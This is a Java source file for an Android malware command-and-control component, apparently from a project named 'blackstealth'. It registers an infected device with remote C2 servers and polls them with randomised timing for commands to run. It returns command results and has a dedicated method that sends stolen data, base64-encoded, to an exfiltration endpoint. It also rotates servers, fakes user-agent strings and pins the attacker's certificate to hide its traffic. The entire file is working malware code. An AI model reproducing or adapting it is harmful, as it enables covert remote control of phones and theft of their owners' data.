package com.offensive.blackstealth.c2_channels;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.security.*;
import java.security.cert.*;
import java.util.*;
import java.util.concurrent.*;
import javax.net.ssl.*;

/**
 * HTTPS C2 Channel with Certificate Pinning
 * Prevents MITM attacks and ensures secure C2 communication
 */
public class HttpsPinningC2 {
    private static final String TAG = "HttpsPinningC2";
    
    private List<String> c2Servers;
    private int currentServerIndex = 0;
    private Set<String> pinnedCertHashes;
    private SSLSocketFactory sslSocketFactory;
    private HostnameVerifier hostnameVerifier;
    private ExecutorService executor;
    private boolean isRunning = false;
    private String deviceId;
    private String sessionKey;
    private C2Callback callback;
    
    public interface C2Callback {
        void onCommandReceived(String command);
        void onError(String error);
    }
    
    public HttpsPinningC2(List<String> servers, String deviceId) {
        this.c2Servers = new ArrayList<>(servers);
        this.deviceId = deviceId;
        this.pinnedCertHashes = new HashSet<>();
        this.executor = Executors.newFixedThreadPool(3);
    }
    
    /**
     * Add pinned certificate hash (SHA-256)
     */
    public void addPinnedCert(String sha256Hash) {
        pinnedCertHashes.add(sha256Hash.toLowerCase().replace(":", ""));
    }
    
    public void setCallback(C2Callback callback) {
        this.callback = callback;
    }
    
    /**
     * Initialize SSL with certificate pinning
     */
    public void initialize() throws Exception {
        TrustManager[] trustManagers = new TrustManager[] {
            new X509TrustManager() {
                @Override
                public void checkClientTrusted(X509Certificate[] chain, String authType) {}
                
                @Override
                public void checkServerTrusted(X509Certificate[] chain, String authType) 
                        throws CertificateException {
                    if (pinnedCertHashes.isEmpty()) return; // No pinning if no certs added
                    
                    for (X509Certificate cert : chain) {
                        String certHash = getCertificateHash(cert);
                        if (pinnedCertHashes.contains(certHash)) {
                            return; // Certificate is pinned
                        }
                    }
                    throw new CertificateException("Certificate not pinned!");
                }
                
                @Override
                public X509Certificate[] getAcceptedIssuers() {
                    return new X509Certificate[0];
                }
            }
        };
        
        SSLContext sslContext = SSLContext.getInstance("TLS");
        sslContext.init(null, trustManagers, new SecureRandom());
        this.sslSocketFactory = sslContext.getSocketFactory();
        
        this.hostnameVerifier = (hostname, session) -> {
            // Verify hostname matches expected C2 domains
            for (String server : c2Servers) {
                try {
                    URL url = new URL(server);
                    if (url.getHost().equals(hostname)) return true;
                } catch (Exception e) {}
            }
            return false;
        };
        
        Log.i(TAG, "SSL initialized with " + pinnedCertHashes.size() + " pinned certs");
    }
    
    /**
     * Start C2 communication
     */
    public void start() {
        if (isRunning) return;
        isRunning = true;
        
        executor.submit(() -> {
            while (isRunning) {
                try {
                    // Register if no session
                    if (sessionKey == null) {
                        register();
                    }
                    
                    // Beacon for commands
                    String command = beacon();
                    if (command != null && !command.isEmpty()) {
                        if (callback != null) callback.onCommandReceived(command);
                    }
                    
                    // Random jitter 30-90 seconds
                    Thread.sleep(30000 + (long)(Math.random() * 60000));
                    
                } catch (Exception e) {
                    Log.e(TAG, "C2 error: " + e.getMessage());
                    rotateServer();
                    try { Thread.sleep(10000); } catch (Exception ex) {}
                }
            }
        });
    }
    
    public void stop() {
        isRunning = false;
        executor.shutdownNow();
    }
    
    /**
     * Register with C2 server
     */
    private void register() throws Exception {
        Map<String, String> data = new HashMap<>();
        data.put("device_id", deviceId);
        data.put("os", "Android " + android.os.Build.VERSION.RELEASE);
        data.put("model", android.os.Build.MODEL);
        data.put("timestamp", String.valueOf(System.currentTimeMillis()));
        
        String response = post("/api/register", mapToJson(data));
        
        if (response != null && response.contains("session_key")) {
            // Parse session key from JSON response
            int start = response.indexOf("\"session_key\":\"") + 15;
            int end = response.indexOf("\"", start);
            sessionKey = response.substring(start, end);
            Log.i(TAG, "Registered with C2, session: " + sessionKey.substring(0, 8) + "...");
        }
    }
    
    /**
     * Beacon to C2 for commands
     */
    private String beacon() throws Exception {
        String url = "/api/beacon?device_id=" + URLEncoder.encode(deviceId, "UTF-8") +
                    "&session=" + URLEncoder.encode(sessionKey, "UTF-8");
        
        String response = get(url);
        
        if (response != null && response.contains("\"command\":")) {
            int start = response.indexOf("\"command\":\"") + 11;
            int end = response.indexOf("\"", start);
            return response.substring(start, end);
        }
        return null;
    }
    
    /**
     * Send command result to C2
     */
    public void sendResult(String commandId, String result) {
        executor.submit(() -> {
            try {
                Map<String, String> data = new HashMap<>();
                data.put("device_id", deviceId);
                data.put("session", sessionKey);
                data.put("command_id", commandId);
                data.put("result", Base64.encodeToString(result.getBytes(), Base64.NO_WRAP));
                
                post("/api/result", mapToJson(data));
            } catch (Exception e) {
                Log.e(TAG, "Failed to send result: " + e.getMessage());
            }
        });
    }
    
    /**
     * Exfiltrate data to C2
     */
    public void exfiltrate(String dataType, byte[] data) {
        executor.submit(() -> {
            try {
                Map<String, String> payload = new HashMap<>();
                payload.put("device_id", deviceId);
                payload.put("session", sessionKey);
                payload.put("data_type", dataType);
                payload.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
                payload.put("timestamp", String.valueOf(System.currentTimeMillis()));
                
                post("/api/exfil", mapToJson(payload));
            } catch (Exception e) {
                Log.e(TAG, "Exfiltration failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * HTTP GET request with certificate pinning
     */
    private String get(String path) throws Exception {
        URL url = new URL(getCurrentServer() + path);
        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
        
        conn.setSSLSocketFactory(sslSocketFactory);
        conn.setHostnameVerifier(hostnameVerifier);
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(30000);
        conn.setRequestProperty("User-Agent", getRandomUserAgent());
        
        if (conn.getResponseCode() == 200) {
            return readStream(conn.getInputStream());
        }
        return null;
    }
    
    /**
     * HTTP POST request with certificate pinning
     */
    private String post(String path, String jsonBody) throws Exception {
        URL url = new URL(getCurrentServer() + path);
        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
        
        conn.setSSLSocketFactory(sslSocketFactory);
        conn.setHostnameVerifier(hostnameVerifier);
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(30000);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("User-Agent", getRandomUserAgent());
        
        OutputStream os = conn.getOutputStream();
        os.write(jsonBody.getBytes());
        os.flush();
        os.close();
        
        if (conn.getResponseCode() == 200) {
            return readStream(conn.getInputStream());
        }
        return null;
    }
    
    /**
     * Get SHA-256 hash of certificate
     */
    private String getCertificateHash(X509Certificate cert) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(cert.getPublicKey().getEncoded());
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
    
    private String readStream(InputStream is) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line);
        }
        reader.close();
        return sb.toString();
    }
    
    private String mapToJson(Map<String, String> map) {
        StringBuilder sb = new StringBuilder("{");
        boolean first = true;
        for (Map.Entry<String, String> entry : map.entrySet()) {
            if (!first) sb.append(",");
            sb.append("\"").append(entry.getKey()).append("\":\"")
              .append(entry.getValue().replace("\"", "\\\"")).append("\"");
            first = false;
        }
        sb.append("}");
        return sb.toString();
    }
    
    private String getCurrentServer() {
        return c2Servers.get(currentServerIndex);
    }
    
    private void rotateServer() {
        currentServerIndex = (currentServerIndex + 1) % c2Servers.size();
        Log.i(TAG, "Rotating to server: " + getCurrentServer());
    }
    
    private String getRandomUserAgent() {
        String[] userAgents = {
            "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 Chrome/91.0.4472.120",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/89.0.4389.105",
            "Mozilla/5.0 (Android 11; Mobile) Gecko/89.0 Firefox/89.0",
            "Dalvik/2.1.0 (Linux; U; Android 11; Pixel 4 Build/RQ3A.210705.001)"
        };
        return userAgents[(int)(Math.random() * userAgents.length)];
    }
}
